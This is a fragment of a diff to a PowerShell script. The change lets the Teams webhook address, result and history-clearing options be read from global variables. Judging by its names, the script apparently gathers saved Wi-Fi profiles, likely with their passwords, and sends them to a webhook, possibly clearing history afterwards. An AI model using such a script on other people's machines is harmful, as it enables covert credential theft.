@@ -4,6 +4,19 @@ param(
     [switch]$clearHistory
 )
 
+# If parameters are not passed, check if the terminal-level variables exist
+if (-not $teamsWebhookURI) {
+    $teamsWebhookURI = $global:teamsWebhookURI
+}
+
+if (-not $returnResult) {
+    $returnResult = $global:returnResult
+}
+
+if (-not $clearHistory) {
+    $clearHistory = $global:clearHistory
+}
+
 # Create an array to hold Wi-Fi data
 $wifiProfiles = @()
 
